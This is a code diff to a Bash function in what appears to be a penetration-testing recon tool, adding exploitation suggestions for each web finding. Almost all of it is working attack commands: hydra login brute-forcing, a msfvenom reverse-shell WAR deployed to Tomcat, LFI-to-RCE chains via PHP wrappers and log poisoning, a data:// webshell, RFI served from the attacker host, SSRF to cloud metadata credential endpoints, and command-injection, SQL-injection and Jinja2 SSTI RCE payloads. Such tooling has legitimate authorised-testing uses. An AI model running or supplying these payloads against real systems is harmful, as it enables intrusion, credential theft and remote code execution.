@@ -1434,7 +1434,7 @@ generate_next_steps() {
             "curl -skI ${url%/}/manager/html" \
             "curl -skI ${url%/}/manager/status" \
             "# Brute default creds (tomcat:tomcat, admin:admin, manager:manager, tomcat:s3cret):" \
-            "hydra -L /usr/share/seclists/Usernames/tomcat-usernames.txt -P /usr/share/seclists/Passwords/tomcat-betterdefaults.txt $(get_host "$url") http-get /manager/html" \
+            "hydra -L /usr/share/seclists/Usernames/tomcat-usernames.txt -P /usr/share/seclists/Passwords/tomcat-betterdefaults.txt -s $(get_port "$url") $(get_host "$url") $(get_proto "$url")-get /manager/html" \
             "# Build + deploy WAR shell:" \
             "msfvenom -p java/jsp_shell_reverse_tcp LHOST=${KALI_IP} LPORT=4444 -f war -o /tmp/shell.war" \
             "curl -v -u 'tomcat:tomcat' --upload-file /tmp/shell.war '${url%/}/manager/text/deploy?path=/shell'" \
@@ -1461,7 +1461,7 @@ generate_next_steps() {
             "phpMyAdmin detected" \
             "whatweb or path probes matched phpMyAdmin" \
             "curl -sk ${url%/}/phpmyadmin/ | sed -n '1,80p'" \
-            "hydra -l root -P /usr/share/wordlists/fasttrack.txt $(get_host "$url") http-post-form '/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:F=Cannot log in'" \
+            "hydra -l root -P /usr/share/wordlists/fasttrack.txt -s $(get_port "$url") $(get_host "$url") $(get_proto "$url")-post-form '/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:F=Cannot log in'" \
             "# After login — read files:" \
             "# SQL> SELECT LOAD_FILE('/etc/passwd');" \
             "# SQL> SELECT LOAD_FILE('/var/www/html/config.php');" \
@@ -1475,10 +1475,13 @@ generate_next_steps() {
     if [[ -n "$param_lines" ]]; then
         local param_cmds=()
         local lfi_cmds=()
+        local lfi_rce_cmds=()
         local rfi_cmds=()
         local cmdi_cmds=()
         local sqli_cmds=()
         local xss_cmds=()
+        local ssti_cmds=()
+        local ssrf_cmds=()
         while IFS= read -r param_line; do
             local param_url
             param_url=$(echo "$param_line" | awk '{print $1}')
@@ -1492,16 +1495,56 @@ generate_next_steps() {
             param_cmds+=("# XSS test:")
             param_cmds+=("curl -sk '${param_url/testvalue/%3Cscript%3Ealert(1)%3C%2Fscript%3E}'")
             if echo "$param_url" | grep -qiE '[?&](file|path|page|include|template|view|doc|download|redirect|url)='; then
-                lfi_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2F..%2Fetc%2Fpasswd}'")
+                lfi_cmds+=("# Try multiple traversal depths + absolute path:")
+                lfi_cmds+=("for d in 1 2 3 4 5 6 7 8; do prefix=\$(printf '..%%2F%%.0s' \$(seq 1 \$d)); echo \"-- depth \$d --\"; curl -sk \"${param_url/testvalue/\${prefix}etc%2Fpasswd}\" | head -2; done")
+                lfi_cmds+=("curl -sk '${param_url/testvalue/%2Fetc%2Fpasswd}'   # absolute path")
+                lfi_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2F..%2Fetc%2Fpasswd%00}'   # null byte (PHP < 5.3)")
                 lfi_cmds+=("ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u '${param_url/testvalue/FUZZ}' -mr 'root:' -mc all")
+                lfi_cmds+=("ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u '${param_url/testvalue/FUZZ}' -mr 'root:' -mc all")
+
+                # LFI-to-RCE escalation wrappers (manual execution — not auto-exploited)
+                lfi_rce_cmds+=("# PHP filter wrapper — disclose source of PHP files (find creds in config):")
+                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/php:%2F%2Ffilter%2Fconvert.base64-encode%2Fresource=index}' | tr -d '\\r\\n' | base64 -d")
+                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/php:%2F%2Ffilter%2Fconvert.base64-encode%2Fresource=config}' | tr -d '\\r\\n' | base64 -d")
+                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/php:%2F%2Ffilter%2Fconvert.base64-encode%2Fresource=..%2Fconfig%2Fdatabase}' | tr -d '\\r\\n' | base64 -d")
+                lfi_rce_cmds+=("# data:// wrapper — direct PHP exec (needs allow_url_include=On):")
+                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/data:%2F%2Ftext%2Fplain,%3C%3Fphp%20system(%24_GET%5B%22c%22%5D)%3B%20%3F%3E}&c=id'")
+                lfi_rce_cmds+=("# expect:// wrapper — if expect PHP extension loaded:")
+                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/expect:%2F%2Fid}'")
+                lfi_rce_cmds+=("# Log poisoning — step 1 inject PHP in User-Agent, step 2 include access log:")
+                lfi_rce_cmds+=("curl -sk -A '<?php system(\$_GET[\"c\"]); ?>' '${url%/}/'")
+                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2F..%2Fvar%2Flog%2Fapache2%2Faccess.log}&c=id'")
+                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log}&c=id'")
+                lfi_rce_cmds+=("# Session-file poisoning (grab PHPSESSID from Set-Cookie first):")
+                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2F..%2Fvar%2Flib%2Fphp%2Fsessions%2Fsess_<PHPSESSID>}'")
+                lfi_rce_cmds+=("# /proc/self/environ poisoning (send PHP in User-Agent, then read environ):")
+                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron}'")
             fi
-            if echo "$param_url" | grep -qiE '[?&](url|uri|path|page|file|load|redirect|callback)='; then
+            if echo "$param_url" | grep -qiE '[?&](url|uri|path|src|dest|redirect|callback|next|target|proxy|fetch|link|image|site|load|host|feed)='; then
                 rfi_cmds+=("python3 -m http.server 8000 --directory /tmp")
                 rfi_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2F${KALI_IP}:8000%2Frfi.txt}'")
+
+                # SSRF detection payloads (manual execution)
+                ssrf_cmds+=("# Internal TCP port scan via SSRF:")
+                ssrf_cmds+=("for p in 22 25 80 443 3306 5432 6379 8080 8443 9200 27017; do curl -sk -o /dev/null -w \"port \$p: %{http_code}  %{size_download}b\\n\" --max-time 5 \"${param_url/testvalue/http:%2F%2F127.0.0.1:\${p}%2F}\"; done")
+                ssrf_cmds+=("# Localhost ports vs 0.0.0.0/169.254.169.254 (bypass filters):")
+                ssrf_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2F127.0.0.1%2F}'")
+                ssrf_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F}'   # AWS metadata")
+                ssrf_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F}'")
+                ssrf_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F}' -H 'Metadata-Flavor: Google'   # GCP")
+                ssrf_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2F169.254.169.254%2Fmetadata%2Finstance?api-version=2021-02-01}' -H 'Metadata: true'   # Azure")
+                ssrf_cmds+=("# Protocol smuggling (file://, gopher://, dict://):")
+                ssrf_cmds+=("curl -sk '${param_url/testvalue/file:%2F%2F%2Fetc%2Fpasswd}'")
+                ssrf_cmds+=("curl -sk '${param_url/testvalue/gopher:%2F%2F127.0.0.1:6379%2F_INFO}'   # Redis smuggle")
+                ssrf_cmds+=("curl -sk '${param_url/testvalue/dict:%2F%2F127.0.0.1:11211%2Fstats}'   # memcached stats")
             fi
             if echo "$param_url" | grep -qiE '[?&](cmd|exec|command|ping|host|ip|lookup|query|search)='; then
                 cmdi_cmds+=("curl -sk '${param_url/testvalue/%3Bid}'")
                 cmdi_cmds+=("curl -sk '${param_url/testvalue/%7Cwhoami}'")
+                cmdi_cmds+=("curl -sk '${param_url/testvalue/%60id%60}'")
+                cmdi_cmds+=("curl -sk '${param_url/testvalue/%24(id)}'")
+                cmdi_cmds+=("# Time-based blind cmdi:")
+                cmdi_cmds+=("time curl -sk '${param_url/testvalue/%3Bsleep%205}'")
                 cmdi_cmds+=("ffuf -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -u '${param_url/testvalue/FUZZ}' -mc all -fs 0")
             fi
             if echo "$param_url" | grep -qiE '[?&](id|item|product|cat|category|user|uid|pid|page_id|article)='; then
@@ -1509,10 +1552,29 @@ generate_next_steps() {
                 sqli_cmds+=("curl -sk '${param_url/testvalue/1%20and%201=2}' | head -60")
                 sqli_cmds+=("curl -sk '${param_url/testvalue/1%20or%201=1}' | head -60")
                 sqli_cmds+=("curl -sk '${param_url/testvalue/1%22}' | head -60")
+                sqli_cmds+=("# Time-based blind SQLi (MySQL/MariaDB):")
+                sqli_cmds+=("time curl -sk '${param_url/testvalue/1%27%20AND%20SLEEP(5)--%20-}'")
+                sqli_cmds+=("# UNION-based — determine column count first:")
+                sqli_cmds+=("curl -sk '${param_url/testvalue/1%27%20ORDER%20BY%201--%20-}'")
+                sqli_cmds+=("curl -sk '${param_url/testvalue/1%27%20UNION%20SELECT%201,2,3--%20-}'")
             fi
             if echo "$param_url" | grep -qiE '[?&](q|query|search|s|name|msg|message|comment|return|next|redirect|url)='; then
                 xss_cmds+=("curl -sk '${param_url/testvalue/%3Cscript%3Ealert(1)%3C%2Fscript%3E}'")
                 xss_cmds+=("curl -sk '${param_url/testvalue/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E}'")
+            fi
+            # SSTI — template engines reflect math ops; test across common engines
+            if echo "$param_url" | grep -qiE '[?&](template|view|msg|message|name|greeting|email|subject|comment|title|q|query|search|page)='; then
+                ssti_cmds+=("# SSTI — if 49 appears in response, template engine is evaluating expressions")
+                ssti_cmds+=("curl -sk '${param_url/testvalue/%7B%7B7*7%7D%7D}'           # Jinja2/Twig  → 49")
+                ssti_cmds+=("curl -sk '${param_url/testvalue/%7B%7B7*%277%27%7D%7D}'     # Jinja2=7777777 / Twig=49 (differentiator)")
+                ssti_cmds+=("curl -sk '${param_url/testvalue/%24%7B7*7%7D}'             # FreeMarker/Spring EL → 49")
+                ssti_cmds+=("curl -sk '${param_url/testvalue/%3C%25%3D%207*7%20%25%3E}' # ERB (Ruby) → 49")
+                ssti_cmds+=("curl -sk '${param_url/testvalue/%23%7B7*7%7D}'             # Smarty/Pebble/Velocity → 49")
+                ssti_cmds+=("curl -sk '${param_url/testvalue/%25%7B7*7%7D}'             # Struts/OGNL → 49")
+                ssti_cmds+=("# If Jinja2 confirmed — dump config + RCE via Python:")
+                ssti_cmds+=("curl -sk '${param_url/testvalue/%7B%7B+config.items()+%7D%7D}'")
+                ssti_cmds+=("# Jinja2 RCE payload (adjust Popen index after enumerating subclasses):")
+                ssti_cmds+=("# {{ ''.__class__.__mro__[1].__subclasses__()[<Popen_idx>]('id',shell=True,stdout=-1).communicate() }}")
             fi
         done <<< "$param_lines"
         append_next_finding "$next_file" \
@@ -1523,31 +1585,49 @@ generate_next_steps() {
             append_next_finding "$next_file" \
                 "Traversal/LFI-style parameter found" \
                 "parameter name suggests file/path/page/include/download handling" \
-                "${lfi_cmds[@]:0:6}"
+                "${lfi_cmds[@]:0:8}"
+        fi
+        if (( ${#lfi_rce_cmds[@]} > 0 )); then
+            append_next_finding "$next_file" \
+                "LFI-to-RCE wrappers (run after LFI confirmed)" \
+                "PHP filter / data:// / log-poisoning / session-poisoning pivots" \
+                "${lfi_rce_cmds[@]:0:14}"
         fi
         if (( ${#rfi_cmds[@]} > 0 )); then
             append_next_finding "$next_file" \
                 "RFI-capable parameter name found" \
                 "parameter name suggests URL/path loading behavior" \
-                "${rfi_cmds[@]:0:6}"
+                "${rfi_cmds[@]:0:4}"
+        fi
+        if (( ${#ssrf_cmds[@]} > 0 )); then
+            append_next_finding "$next_file" \
+                "SSRF-style parameter found" \
+                "parameter name accepts URL — test internal ports, cloud metadata, protocol smuggling" \
+                "${ssrf_cmds[@]:0:12}"
         fi
         if (( ${#cmdi_cmds[@]} > 0 )); then
             append_next_finding "$next_file" \
                 "Command-injection-style parameter found" \
                 "parameter name suggests command, ping, host, lookup, query, or search behavior" \
-                "${cmdi_cmds[@]:0:6}"
+                "${cmdi_cmds[@]:0:8}"
         fi
         if (( ${#sqli_cmds[@]} > 0 )); then
             append_next_finding "$next_file" \
                 "SQLi-style parameter found" \
                 "parameter name suggests id/item/product/user/category lookup behavior" \
-                "${sqli_cmds[@]:0:6}"
+                "${sqli_cmds[@]:0:10}"
         fi
         if (( ${#xss_cmds[@]} > 0 )); then
             append_next_finding "$next_file" \
                 "XSS-reflection-style parameter found" \
                 "parameter name suggests search/message/comment/redirect reflection behavior" \
                 "${xss_cmds[@]:0:6}"
+        fi
+        if (( ${#ssti_cmds[@]} > 0 )); then
+            append_next_finding "$next_file" \
+                "SSTI-candidate parameter found" \
+                "parameter name suggests template/message/greeting reflection — test engine math ops" \
+                "${ssti_cmds[@]:0:12}"
         fi
     fi
 
